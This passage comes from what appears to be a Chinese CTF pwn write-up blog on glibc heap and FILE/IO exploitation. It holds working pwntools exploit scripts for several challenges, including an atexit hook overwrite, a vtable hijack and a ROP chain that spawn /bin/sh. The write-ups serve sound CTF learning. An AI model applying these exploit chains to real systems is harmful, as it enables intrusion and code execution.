     ru(b<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">        cookie=u64(rld().ljust(<span class="number">8</span>,b<span class="string">&quot;\0&quot;</span>))</span><br><span class="line">        first_heap_addr=(cookie&lt;&lt;<span class="number">12</span>)+<span class="number">0x290</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">7</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">8</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">7</span>):</span><br><span class="line">    add(i,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">#__elf_set___libc_atexit_element__IO_cleanup__=libc_base+<span class="number">0x21a6c8</span></span><br><span class="line">__libc_atexit=libc_base+libc.get_section_by_name(<span class="string">&quot;__libc_atexit&quot;</span>).header[<span class="string">&quot;sh_addr&quot;</span>]</span><br><span class="line">add(<span class="number">7</span>,p64((__libc_atexit<span class="number">-0x8</span>)^cookie))</span><br><span class="line">add(<span class="number">8</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">9</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget=<span class="number">0xeeccc</span>+libc_base</span><br><span class="line">add(<span class="number">10</span>,p64(<span class="number">0</span>)+p64(one_gadget))</span><br><span class="line"><span class="meta">#debug()</span></span><br><span class="line">sla(b<span class="string">&quot;: &quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<p>这个题目首先有两点</p>
<p>free次数有限</p>
<p>在libc-2.34中，一次doublefree至少需要free 10次，因为tcache会check每一个chunk是否一样，同时free到fastbin的时候也会先去tache里面check是否重复，所以7次填满tcache,fastbin double free</p>
<p>但题目只有10次，所以相当于这次double free是用来写backdoor</p>
<p>但是没有libc泄露</p>
<p>所以libc泄露就要去整数溢出</p>
<p>0x60004200</p>
<p>0x60004200*8&#x3D;0x300021000 ，0x21000保证我们会用 mmap，因为当前top chunk大小为0x20df0左右</p>
<p>这个时候利用main_arena里面的指针show就可以了</p>
<p>由于2.34没有free_hook之类的，所以放到exit_hook里面</p>
<p>本来旧版本可以打exit_function→fun[],但里面的地址xor了fs:[0x30]所以无法修改</p>
<p>注意到最后有个<strong>elf_set___libc_atexit_elementIO_cleanup的地址，里面保存了io_cleanup</strong></p>
<p>这个函数地址没有校验，就打这个</p>
<p>one_gadget一把锁</p>
<p>后续 libc-2.24以后，对于这个exit_function_list的地址都做了异或，所以不能再修改这个了</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656842745707-0c8b7415-15df-4631-9521-79682cd0e024.png#averageHue=%23fdfdfc&clientId=u9d5fd636-f51f-4&from=paste&height=366&id=u1cdd9190&originHeight=457&originWidth=898&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98909&status=done&style=none&taskId=u283bdd9a-ac35-48ef-806a-1c171c6d304&title=&width=718.4" alt="image.png"></p>
<p>但由于exit调用传入的run_list_atexit是true,所以可以使用RUN_HOOK</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656842753785-b35c744e-d347-4d7f-8420-4f70b973f756.png#averageHue=%23fdfcfc&clientId=u9d5fd636-f51f-4&from=paste&height=222&id=u1ad39680&originHeight=277&originWidth=958&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51335&status=done&style=none&taskId=u669ab4b8-1b6a-4fc8-b19e-1ed19c72fcc&title=&width=766.4" alt="image.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Run all the functions hooked on the set called NAME.</span></span><br><span class="line"><span class="comment">   Each function is called like this: `function ARGS&#x27;.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> RUN_HOOK(NAME, ARGS)						      \</span></span><br><span class="line"><span class="meta">do &#123;									      \</span></span><br><span class="line"><span class="meta">  void *const *ptr;						      \</span></span><br><span class="line"><span class="meta">  for (ptr = (void *const *) symbol_set_first_element (NAME);		      \</span></span><br><span class="line"><span class="meta">       ! symbol_set_end_p (NAME, ptr); ++ptr)				      \</span></span><br><span class="line"><span class="meta">    (*(__##NAME##_hook_function_t *) *ptr) ARGS;			      \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br><span class="line"></span><br><span class="line">这里修改一下就是				      </span><br><span class="line"><span class="keyword">do</span> &#123;									     </span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> *ptr;						     </span><br><span class="line">  <span class="keyword">for</span> (ptr = (<span class="type">void</span> *<span class="type">const</span> *) symbol_set_first_element (__libc_atexit);		      \</span><br><span class="line">       ! symbol_set_end_p (__libc_atexit, ptr); ++ptr)				      \</span><br><span class="line">    (*(__##__libc_atexit##<span class="type">_hook_function_t</span> *) *ptr) ();			      \</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> symbol_set_first_element(set)	((void *const *) (&amp;__start_##set))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> symbol_set_end_p(set, ptr) ((ptr) &gt;= (void *const *) &amp;__stop_##set)</span></span><br><span class="line"><span class="keyword">do</span> &#123;									     </span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> *ptr=	(<span class="type">void</span> *<span class="type">const</span> *)		((<span class="type">void</span> *<span class="type">const</span> *) (&amp;__start_##__libc_atexit))			     </span><br><span class="line">  <span class="keyword">for</span> (;! symbol_set_end_p (__libc_atexit, ptr); ++ptr)				     </span><br><span class="line">    (*(__##__libc_atexit##<span class="type">_hook_function_t</span> *) *ptr) ();			    </span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>由于__libc_atexit其实是libc里面的一个段，所以我们就相当于遍历这个段里面的所有指针，对于一案的libc来说，里面其实只有一个函数指针的长度，在libc_2.34中这个函数指针就是_IO_cleanup,我们如果把这个里面保存的值修改了，那么我们就相当于也是hook住了函数</p>
<p>RUN_HOOK展开，把glibc源码里面的定义放到c里面</p>
<p>写如下程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> symbol_set_first_element(set)	((void *const *) (&amp;__start_##set))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> symbol_set_end_p(set, ptr) ((ptr) &gt;= (void *const *) &amp;__stop_##set)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> RUN_HOOK(NAME, ARGS)						      \</span></span><br><span class="line"><span class="meta">do &#123;									      \</span></span><br><span class="line"><span class="meta">  void *const *ptr;						      \</span></span><br><span class="line"><span class="meta">  for (ptr = (void *const *) symbol_set_first_element (NAME);		      \</span></span><br><span class="line"><span class="meta">       ! symbol_set_end_p (NAME, ptr); ++ptr)				      \</span></span><br><span class="line"><span class="meta">    (*(__##NAME##_hook_function_t *) *ptr) ARGS;			      \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gcc 1.c -E</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123; </span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> *ptr= (<span class="type">void</span> *<span class="type">const</span> *) ((<span class="type">void</span> *<span class="type">const</span> *) (&amp;__start___libc_atexit)); </span><br><span class="line"><span class="keyword">for</span> (; ptr&lt;(<span class="type">void</span> *<span class="type">const</span> *) &amp;__stop___libc_atexit; ++ptr)</span><br><span class="line"> (*(<span class="type">____libc_atexit_hook_function_t</span> *) *ptr) (); </span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;<strong>start</strong>_libc_atexit就是__libc_atexit的段起始地址</p>
<p>&amp;<strong>stop</strong>_libc_atexit就是__libc_atexit的结束地址</p>
<h1 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h1><h2 id="flush"><a href="#flush" class="headerlink" title="flush"></a>flush</h2><h3 id="seccon2022-babyfile"><a href="#seccon2022-babyfile" class="headerlink" title="seccon2022-babyfile"></a>seccon2022-babyfile</h3><p>见csdn</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_path = &quot;./chall&quot;</span><br><span class="line">parm=elf_path</span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=&quot;debug&quot;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">    remote_ip = &quot;babyfile.seccon.games&quot;</span><br><span class="line">    remote_port =3157</span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line">else:</span><br><span class="line">    io = process(parm)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def flush():</span><br><span class="line">    sla(&quot;&gt; &quot;, &quot;1&quot;)</span><br><span class="line"></span><br><span class="line">def modify(off, val):</span><br><span class="line">    sla(&quot;&gt; &quot;, &quot;2&quot;)</span><br><span class="line">    sla(&quot;offset: &quot;, str(off))</span><br><span class="line">    sla(&quot;value: &quot;, str(val))</span><br><span class="line"></span><br><span class="line">def change(off,val):</span><br><span class="line">    for i in range(8):</span><br><span class="line">        modify(off,val&amp;0xff)</span><br><span class="line">        off+=1</span><br><span class="line">        val=val&gt;&gt;8</span><br><span class="line"></span><br><span class="line">def ROL(content, key):</span><br><span class="line">    tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;)</span><br><span class="line">    return int(tmp[key:] + tmp[:key], 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">modify(0xd8,0xa8)</span><br><span class="line">flush()</span><br><span class="line"></span><br><span class="line">modify(0xd8,0xa0)</span><br><span class="line">modify(8*5,0x40)#随便一个，只要保证_IO_write_base!=_IO_write_ptr即可</span><br><span class="line">flush()</span><br><span class="line"></span><br><span class="line">modify(8*14,1)#fileno</span><br><span class="line">modify(8*5,0x78)#wirte_ptr</span><br><span class="line">modify(8*4,0x70)#write_base</span><br><span class="line">modify(8*2,0x70)#_IO_read_end=write_base</span><br><span class="line">flush()</span><br><span class="line">libc_base=u64(ru(b&quot;\x7f&quot;).ljust(8,b&quot;\x00&quot;))+0x7f60d3a44000-0x7f60d3c2cf60</span><br><span class="line"></span><br><span class="line">__pointer_chk_guard_addr=libc_base+0x1f3570#大本地就是0x1f35f0</span><br><span class="line">change(8*5,__pointer_chk_guard_addr+0x8)#write_ptr</span><br><span class="line">change(8*4,__pointer_chk_guard_addr)#write_base</span><br><span class="line">change(8*2,__pointer_chk_guard_addr)#read_end</span><br><span class="line">flush()</span><br><span class="line">__pointer_chk_guard=u64(r(8))</span><br><span class="line"></span><br><span class="line">_IO_cookie_jumps=libc_base+0x1e8a20</span><br><span class="line">system_addr=libc_base+libc.sym[&quot;system&quot;]</span><br><span class="line">func_value=ROL(system_addr^__pointer_chk_guard,0x11)#需要异或左移一下</span><br><span class="line">change(0xf0,func_value)#指针的值</span><br><span class="line">change(0xd8,_IO_cookie_jumps+0x18)#修改vtable对到write</span><br><span class="line">change(0xe0,libc_base+0x1b45bd-0x100000000)#这里是bin/sh的地址，但不知道为什么它会多0x100000000，所以就减掉了</span><br><span class="line">flush()</span><br><span class="line"></span><br><span class="line">it()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h2><h3 id="espcially-tu-2016"><a href="#espcially-tu-2016" class="headerlink" title="espcially_tu_2016"></a>espcially_tu_2016</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#espcially_tu_2016">BUUCTF在线评测 (buuoj.cn)</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pop_one_ret=<span class="number">0x0804839d</span></span><br><span class="line">bss_addr=<span class="number">0x804a300</span></span><br><span class="line">leave_ret=<span class="number">0x08048488</span></span><br><span class="line">pop_two_ret=<span class="number">0x0804864e</span></span><br><span class="line">pop_ebp_ret=pop_two_ret+<span class="number">1</span></span><br><span class="line">sla(b<span class="string">&quot;What&#x27;s your name?\n&quot;</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">0x2c</span>+p32(elf.plt[<span class="string">&quot;puts&quot;</span>])+p32(pop_one_ret)+p32(elf.got[<span class="string">&quot;puts&quot;</span>])+p32(elf.plt[<span class="string">&quot;puts&quot;</span>])+p32(pop_one_ret)+p32(elf.got[<span class="string">&quot;puts&quot;</span>])+p32(<span class="number">0x8048410</span>)+p32(pop_two_ret)+p32(<span class="number">0x80486AF</span>)+p32(bss_addr)+p32(<span class="number">0x8048410</span>)+p32(pop_two_ret)+p32(<span class="number">0x80486AF</span>)+p32(bss_addr+<span class="number">8</span>)+p32(pop_ebp_ret)+p32(bss_addr<span class="number">-4</span>)+p32(leave_ret))</span><br><span class="line">sla(b<span class="string">&quot;What&#x27;s your favorite number?\n&quot;</span>,b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">ru(b<span class="string">&quot;number!\n&quot;</span>)</span><br><span class="line">libc_base=u32(ru(b<span class="string">&quot;\xf7&quot;</span>))-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"><span class="meta">#sleep(1)</span></span><br><span class="line">sl(str(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line">sl(str(libc_base+next(libc.search(b<span class="string">&quot;/bin/sh&quot;</span>))-(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)))</span><br><span class="line"><span class="meta">#s(p32(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>])+p32(0)+p32(libc_base+next(libc.search(b<span class="string">&quot;/bin/sh&quot;</span>))))</span></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h2><h3 id="xman夏令营选排位赛-2018-challenge1"><a href="#xman夏令营选排位赛-2018-challenge1" class="headerlink" title="xman夏令营选排位赛_2018_challenge1"></a>xman夏令营选排位赛_2018_challenge1</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#xman%E5%A4%8F%E4%BB%A4%E8%90%A5%E9%80%89%E6%8E%92%E4%BD%8D%E8%B5%9B_2018_challenge1">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>一个简答利用伪造IO进行的题目</p>
<p>利用点是fclose,通过溢出把stream地址改为我们的bss</p>
<p>由于_IO_un_link不可以伪造，所以<code>0x2000 _IO_IS_FILEBUF 的值</code>，由于flag刚好是io的第一个头，所以2对应的那个bit不可以是1</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656842797453-b6cc7ea6-53d7-4769-a4ad-fabc2e988f82.png#averageHue=%23979695&clientId=u9d5fd636-f51f-4&from=paste&height=152&id=ubf0d24ca&originHeight=190&originWidth=796&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42256&status=done&style=none&taskId=u8ad7c58e-0dda-4bd8-a18c-e4d7a68f0dc&title=&width=636.8" alt="image.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line">__attribute__ ((__always_inline__))</span><br><span class="line">_IO_acquire_lock_fct (FILE **p)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *fp = *p;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_USER_LOCK) == <span class="number">0</span>)</span><br><span class="line">    _IO_funlockfile (fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_funlockfile(_fp) \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (((_fp)-&gt;_flags &amp; _IO_USER_LOCK) == 0)				      \</span></span><br><span class="line"><span class="meta">    _IO_lock_unlock (*(_fp)-&gt;_lock)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_lock_unlock(_name) \</span></span><br><span class="line"><span class="meta">  do &#123;									      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (--(_name).cnt == 0)						      \</span></span><br><span class="line"><span class="meta">      &#123;									      \</span></span><br><span class="line"><span class="meta">        (_name).owner = NULL;						      \</span></span><br><span class="line"><span class="meta">	lll_unlock ((_name).lock, LLL_PRIVATE);				      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure>

<p>所以这里面不能去调用，所以<code>#define **[_IO_USER_LOCK](https://elixir.bootlin.com/glibc/glibc-2.23/C/ident/_IO_USER_LOCK)** 0x8000</code>,所以8对应的这个bit应该为1</p>
<p>这一步无所谓，因为if肯定为false根据第一部的伪造</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656842820045-6f574aee-b950-496f-9313-e45db88cb612.png#averageHue=%23949392&clientId=u9d5fd636-f51f-4&from=paste&height=172&id=u5cc4c0c3&originHeight=215&originWidth=989&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58755&status=done&style=none&taskId=u8e135df7-27e1-4630-a56a-5836f5790d5&title=&width=791.2" alt="image.png"></p>
<p>实际好像release这里没什么效果，因为我确实页没有上锁，跳过了，_IO_FINISH刚好是jmp table里面的所以可以劫持，刚好位于vtable+0x10偏移</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656842830290-2dc86023-a3da-44f3-b941-46ae549a0556.png#averageHue=%23303030&clientId=u9d5fd636-f51f-4&from=paste&height=557&id=ud0b8d954&originHeight=696&originWidth=915&originalType=binary&ratio=1&rotation=0&showTitle=false&size=285737&status=done&style=none&taskId=u408c8216-3d04-4dfd-aadb-a27f0b4aeb3&title=&width=732" alt="image.png"></p>
<p>所以开始攻击</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 修改stream的地址为我们的伪造</span><br><span class="line">fake_stream = b<span class="string">&quot;a&quot;</span> * <span class="number">0x100</span> + p64(<span class="number">0x6010C0</span>)#这里因为是gets，所以不能有<span class="number">0</span></span><br><span class="line">sla(b<span class="string">&quot;&gt;&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sl(fake_stream)</span><br><span class="line">fake_file = b<span class="string">&quot;a&quot;</span> * <span class="number">0xD8</span> + p64(<span class="number">0x6010C0</span>)#修改vtable地址</span><br><span class="line">sla(b<span class="string">&quot;&gt;&quot;</span>, b<span class="string">&quot;1&quot;</span>) </span><br><span class="line">sl(fake_file)</span><br><span class="line">sla(b<span class="string">&quot;&gt;&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">fake_vtable = b<span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + p64(<span class="number">0x400897</span>)#修改function为backdoor</span><br><span class="line">sl(fake_vtable)</span><br><span class="line">sla(b<span class="string">&quot;&gt;&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sl(b<span class="string">&quot;a\x80&quot;</span>)#只用修改这一位为<span class="number">1</span>就好</span><br><span class="line">sla(b<span class="string">&quot;&gt;&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h2 id="close"><a href="#close" class="headerlink" title="close"></a>close</h2><h3 id="d3ctf-2019-unprintablev"><a href="#d3ctf-2019-unprintablev" class="headerlink" title="d3ctf_2019_unprintablev"></a>d3ctf_2019_unprintablev</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#d3ctf_2019_unprintablev">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>覆盖stdin位stderr达到回显一次的目的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from git import RootUpdateProgress</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span 